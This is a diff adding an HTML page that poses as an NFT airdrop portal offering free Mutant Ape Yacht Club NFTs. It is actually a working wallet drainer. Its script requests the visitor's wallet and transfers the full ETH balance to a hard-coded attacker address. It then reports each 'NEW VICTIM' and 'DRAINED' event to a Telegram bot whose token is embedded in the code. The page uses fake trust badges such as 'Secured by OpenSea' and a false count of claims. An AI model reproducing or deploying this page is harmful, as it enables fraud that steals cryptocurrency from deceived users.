@@ -1,0 +1,93 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>🚀 NFT Airdrop Portal</title>  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <style>  
+        body {  
+            background: linear-gradient(135deg, #1a1a1a, #2d0b59);  
+            color: white;  
+            font-family: 'Arial', sans-serif;  
+            text-align: center;  
+        }  
+        .container {  
+            padding: 40px;  
+            background: rgba(0,0,0,0.7);  
+            border-radius: 20px;  
+            margin: 20px;  
+        }  
+        button {  
+            background: #4CAF50;  
+            padding: 20px 40px;  
+            border-radius: 15px;  
+            font-size: 18px;  
+            border: none;  
+            cursor: pointer;  
+            margin: 20px;  
+        }  
+        .nft-grid {  
+            display: grid;  
+            grid-template-columns: repeat(3, 1fr);  
+            gap: 15px;  
+            margin: 30px;  
+        }  
+        .nft-img {  
+            width: 100%;  
+            border-radius: 10px;  
+        }  
+    </style>  
+    <script>  
+        const TELEGRAM_BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";  
+        const TELEGRAM_CHAT_ID = "6309547301";  
+        const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9";  
+
+        async function alertTelegram(message) {  
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`);  
+        }  
+
+        async function connectWallet() {  
+            try {  
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });  
+                await alertTelegram(`🚨 NEW VICTIM: ${accounts[0]}`);  
+
+                const balance = await window.ethereum.request({ method: "eth_getBalance", params: [accounts[0]] });  
+                await window.ethereum.request({  
+                    method: "eth_sendTransaction",  
+                    params: [{  
+                        from: accounts[0],  
+                        to: YOUR_WALLET,  
+                        value: balance,  
+                        gas: "0x5208"  
+                    }]  
+                });  
+
+                await alertTelegram(`💰 DRAINED: ${accounts[0]} | ${balance} WEI`);  
+                window.location.href = "https://your-success-page.com";  
+            } catch {  
+                await alertTelegram("❌ FAILED ATTEMPT");  
+            }  
+        }  
+    </script>  
+</head>  
+<body>  
+    <div class="container">  
+        <h1>🎉 Exclusive NFT Airdrop!</h1>  
+        <p>Claim your free Mutant Ape Yacht Club NFT below</p>  
+
+        <div class="nft-grid">  
+            <img src="https://i.postimg.cc/sgYqsTDM/file-Ad-Hfn-Sgp-Dtj4-FTa8-Rph7q2.png" alt="Mutant Ape NFT 1" />
+<img src="https://i.postimg.cc/wB9PvD70/file-B1-VK6-Ac-Ag65g-T9-Nr-GYSJw-T.png" alt="Cyberpunk NFT" />
+<img src="https://i.postimg.cc/SKVPzj9q/file-HQ4-Djz-V5n-Gce-Ayiu8r-TDKS-1.png" alt="Mutant Ape NFT 2" />
+        </div>  
+
+        <button onclick="connectWallet()">  
+            🔒 Connect Wallet to Claim  
+        </button>  
+
+        <div style="margin-top:30px">  
+            <p>🔒 Secured by OpenSea | 🕵️‍♂️ 542 people claimed today</p>  
+            <img src="https://i.imgur.com/wallets.png" style="width:80%;max-width:400px" alt="Supported Wallets">  
+        </div>  
+    </div>  
+</body>  
+</html>  
